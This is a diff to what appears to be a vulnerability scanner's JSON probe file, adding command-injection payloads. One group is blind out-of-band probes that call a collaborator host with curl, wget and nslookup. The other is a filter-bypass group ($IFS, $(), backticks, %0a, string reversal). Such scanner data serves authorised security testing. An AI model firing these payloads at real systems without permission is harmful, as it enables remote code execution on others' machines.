@@ -104,6 +104,110 @@
           "variables": {}
         }
       ]
+    },
+    "blind_oob": {
+      "description": "Out-of-band blind command injection — uses curl/wget/nslookup to trigger DNS or HTTP callbacks to Burp Collaborator",
+      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Python"],
+      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
+      "probes": [
+        {
+          "payload": "{{baseline}}; curl http://{{callback}}",
+          "description": "OOB command injection via curl — HTTP interaction on collaborator confirms blind RCE",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; nslookup {{callback}}",
+          "description": "OOB command injection via nslookup — DNS interaction on collaborator confirms blind RCE",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}| wget http://{{callback}}/ci_test",
+          "description": "OOB command injection via wget — HTTP GET to collaborator with unique path confirms blind RCE",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "filter_bypass": {
+      "description": "Filter bypass command injection from PayloadsAllTheThings — IFS, brace expansion, substitution, newline, and reverse string tricks",
+      "tech_match": ["Apache", "Nginx", "PHP", "Flask", "Python"],
+      "param_match": ["cmd", "exec", "command", "ping", "ip", "host", "url", "dir", "path"],
+      "probes": [
+        {
+          "payload": "{{baseline}}$IFS$9id",
+          "description": "IFS (Internal Field Separator) bypass for space filtering — $IFS acts as whitespace substitute",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}};{id}",
+          "description": "Brace expansion command injection — some shells execute {id} as a command group",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}$(id)",
+          "description": "Command substitution injection (dollar-paren form) — output replaces the substitution inline",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}`id`",
+          "description": "Backtick command substitution — legacy form, still evaluated in many shells",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}%0aid",
+          "description": "Newline (URL-encoded %0a) as command separator — bypasses filters checking for ; | & characters only",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}|rev<<<'di'",
+          "description": "Reverse string trick — 'di' reversed is 'id'; bypasses filters matching literal command names",
+          "matchers": [
+            {"type": "word", "words": ["uid="], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
     }
   }
 }
